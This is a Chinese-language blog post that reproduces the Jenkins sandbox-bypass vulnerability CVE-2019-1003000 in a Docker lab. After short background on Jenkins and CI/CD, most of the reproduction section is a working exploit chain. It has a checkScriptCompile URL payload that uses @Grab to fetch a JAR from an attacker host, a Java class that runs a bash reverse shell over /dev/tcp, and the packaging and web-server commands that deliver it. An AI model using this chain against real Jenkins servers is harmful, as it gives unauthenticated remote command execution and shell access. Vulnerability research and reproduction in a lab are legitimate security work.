---
layout:     post
title:      【漏洞复现】Jenkins-反序列化漏洞复现及分析（CVE-2019-1003000）
subtitle:   反序列化漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 Jenkins
2019年1月8号，Jenkins官方发布了安全公告，披露了关于Script Security和Pipeline插件的sandbox bypass漏洞，漏洞CVE编号为：CVE-2019-1003000。该漏洞允许“Overall/Read”权限的用户，能够控制SCM中的Jenkinsfile或sandboxed Pipeline共享库内容的用户可绕过沙盒保护，并在Jenkins主服务器上执行任意命令。

Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有SVN、GIT，构建工具有Maven、Ant、Gradle。
## 0x01 CI与CD
CI(Continuous integration，中文意思是持续集成)是一种软件开发时间。持续集成强调开发人员提交了新代码之后，立刻进行构建、（单元）测试。根据测试结果，我们可以确定新代码和原有代码能否正确地集成在一起。借用网络图片对CI加以理解。
![-c](/img/16027820484943.jpg)

CD(Continuous Delivery， 中文意思持续交付)是在持续集成的基础上，将集成后的代码部署到更贴近真实运行环境(类生产环境)中。比如，我们完成单元测试后，可以把代码部署到连接数据库的Staging环境中更多的测试。如果代码没有问题，可以继续手动部署到生产环境。下图反应的是CI/CD 的大概工作模式。
![-c](/img/16027820605126.jpg)

Jenkins有一个在Groovy中实现的Pipeline功能。用户发出未经身份验证的GET请求以提供Groovy元编程输入。在此输入中，攻击者可以使用@Grab注释来调用Grape，这是Groovy的内置JAR依赖关系管理工具，并让它下载jar并运行它。

## 0x02 受影响版本
Pipeline: Declarative Plugin up to and including 1.3.4
Pipeline: Groovy Plugin up to and including 2.61
Script Security Plugin up to and including 1.49
## 0x03 漏洞复现
漏洞环境：```docker pull her0ma/CVE-2019-1003000```

Jenkins中没有身份验证，通过以下目录可以访问管理员页面：
```http://192.168.111.130:8080/securityRealm/user/admin```
![-c877](/img/16027820758619.jpg)
访问工作流插件的checkScriptCompile API，payload如下：
```
http://host:ip/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)
@GrabConfig(disableChecksums=true)
@GrabResolver(name='orange.tw', root='http://yourhost/')
@Grab(group='tw.orange', module='0xdf', version='223')
import Orange;
```
value参数的值为：
```
@GrabConfig(disableChecksums=true)
@GrabResolver(name='orange.tw', root='http://yourhost/')
@Grab(group='tw.orange', module='0xdf', version='223')
import Orange;
```
在服务器上创建Java类供payload远程调用
Orange.java文件内容如下：
```java
public class Orange {
 public Orange() {
    try {
      String payload = "bash -i >& /dev/tcp/ip/port 0>&1";
      String[] cmds = { "/bin/bash", "-c", payload };
      java.lang.Runtime.getRuntime().exec(cmds);
    } catch (Exception e) {
    }
  }
}
```
将其编译成Orange.class，并打成jar包移到相应目录中。
```
mkdir -p META-INF/services/
echo Orange > META-INF/services/org.codehaus.groovy.plugins.Runners
jar cvf 0xdf-223.jar Orange.class META-INF
mkdir -p tw/orange/0xdf/223/
mv 0xdf-223.jar tw/orange/0xdf/223/
```
在服务器开启web服务
```
python -m SimpleHTTPServer 8098
```
![-c783](/img/16027820931638.jpg)
![-c243](/img/16027821075459.jpg)

成功反弹shell!


